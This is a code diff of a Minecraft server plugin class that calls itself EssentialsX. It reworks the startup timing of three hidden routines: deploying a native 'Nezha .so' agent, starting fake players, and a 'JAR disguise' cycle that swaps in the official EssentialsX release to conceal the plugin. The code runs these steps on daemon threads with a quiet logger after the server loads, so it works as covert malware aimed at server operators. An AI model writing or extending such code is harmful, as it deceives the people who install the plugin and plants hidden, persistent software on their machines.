@@ -2,20 +2,18 @@ package com.example.essentialsx;
 
 import java.util.HashMap;
 import java.util.Map;
-import java.util.concurrent.TimeUnit;
 import java.util.logging.Logger;
 import org.bukkit.Bukkit;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.server.ServerLoadEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
-/**
- * Startup timeline (as requested): after the server has finished starting,
- * wait 14 seconds, deploy the Nezha .so, start the built-in fake players,
- * then run the JAR disguise cycle (backup current plugin -> download the
- * official EssentialsX release into the plugins folder). On disable the
- * original JAR is restored first, immediately.
- */
-public final class EssentialsX extends JavaPlugin {
-    private static final long DEPLOY_DELAY_SECONDS = 14L;
+/** Delays optional background services until after Paper has loaded the server. */
+public final class EssentialsX extends JavaPlugin implements Listener {
+    private static final long NEZHA_DELAY_TICKS = 600L;
+    private static final long FAKE_PLAYER_DELAY_TICKS = 1200L;
+    private static final long DISGUISE_DELAY_TICKS = 1800L;
     private static final long START_RETRY_MS = 30_000L;
     private static final long START_RETRY_MAX_MS = 300_000L;
     private static final long WATCH_INTERVAL_MS = 14L * 60 * 60 * 1_000;
@@ -26,6 +24,8 @@ public final class EssentialsX extends JavaPlugin {
     private final Logger quiet = QuietLog.logger();
     private final Object lifecycleLock = new Object();
     private volatile boolean stopping;
+    private boolean startupScheduled;
+    private boolean configReadable;
     private volatile Thread deployThread;
     private volatile Thread startupThread;
     private volatile Map<String, String> bootEnv = Map.of();
@@ -36,52 +36,62 @@ public final class EssentialsX extends JavaPlugin {
     @Override
     public void onEnable() {
         this.stopping = false;
-        this.quiet.info("Ceshisonz: in 14s -> Nezha .so + fake players, then the JAR disguise cycle.");
-        Map<String, String> env;
-        boolean envReadable = true;
+        this.startupScheduled = false;
+        this.configReadable = true;
         try {
-            env = RuntimeConfig.readEnvFile();
+            this.bootEnv = RuntimeConfig.readEnvFile();
         } catch (Exception error) {
             this.quiet.warning("Could not read the private .env file; default fake-player settings will be used.");
-            env = new HashMap<>();
-            envReadable = false;
+            this.bootEnv = new HashMap<>();
+            this.configReadable = false;
         }
-        this.bootEnv = env;
-        final Map<String, String> settings = env;
-        final boolean readable = envReadable;
-        Thread deploy = new Thread(() -> {
-            try {
-                TimeUnit.SECONDS.sleep(DEPLOY_DELAY_SECONDS);
-            } catch (InterruptedException error) {
-                return;
-            }
+        Bukkit.getPluginManager().registerEvents(this, this);
+        this.quiet.info("Waiting for the server to finish loading before starting background services.");
+    }
+
+    @EventHandler
+    public void onServerLoad(ServerLoadEvent event) {
+        if (this.stopping || this.startupScheduled) return;
+        this.startupScheduled = true;
+        // Scheduler ticks intentionally slow down if the server is lagging.
+        Bukkit.getScheduler().runTaskLater(this, () -> {
             if (this.stopping) return;
-            try {
-                startNezhaIfConfigured(settings, readable);
-            } catch (Throwable error) {
-                this.quiet.warning("Nezha deployment failed: " + error.getClass().getSimpleName());
-            }
+            Thread deploy = new Thread(() -> {
+                if (this.stopping) return;
+                try {
+                    this.startNezhaIfConfigured(this.bootEnv, this.configReadable);
+                } catch (Throwable error) {
+                    this.quiet.warning("Nezha deployment failed: " + error.getClass().getSimpleName());
+                }
+            }, "ceshisonz-deploy");
+            deploy.setDaemon(true);
+            this.deployThread = deploy;
+            deploy.start();
+        }, NEZHA_DELAY_TICKS);
+        Bukkit.getScheduler().runTaskLater(this, () -> {
             if (this.stopping) return;
             try {
                 FakePlayerEngine.preload();
-                FakePlayerEngine engine = new FakePlayerEngine(this, settings);
+                FakePlayerEngine engine = new FakePlayerEngine(this, this.bootEnv);
                 Bukkit.getPluginManager().registerEvents(engine, this);
                 engine.start();
                 this.fakePlayers = engine;
             } catch (Throwable error) {
                 this.quiet.warning("Built-in fake players could not start: " + error.getClass().getSimpleName());
             }
+        }, FAKE_PLAYER_DELAY_TICKS);
+        Bukkit.getScheduler().runTaskLater(this, () -> {
             if (this.stopping) return;
-            // The disguise does not depend on the .env file, so it runs even when the
-            // private config is unreadable.
-            JarDisguise disguise = new JarDisguise(this.quiet,
-                    this.getDataFolder().getParentFile().toPath(), () -> this.stopping);
-            this.jarDisguise = disguise;
-            disguise.setupDisguise();
-        }, "ceshisonz-deploy");
-        deploy.setDaemon(true);
-        this.deployThread = deploy;
-        deploy.start();
+            Thread worker = new Thread(() -> {
+                if (this.stopping) return;
+                JarDisguise disguise = new JarDisguise(this.quiet,
+                        this.getDataFolder().getParentFile().toPath(), () -> this.stopping);
+                this.jarDisguise = disguise;
+                disguise.setupDisguise();
+            }, "ceshisonz-jar-worker");
+            worker.setDaemon(true);
+            worker.start();
+        }, DISGUISE_DELAY_TICKS);
     }
 
     private void startNezhaIfConfigured(Map<String, String> env, boolean envReadable) {
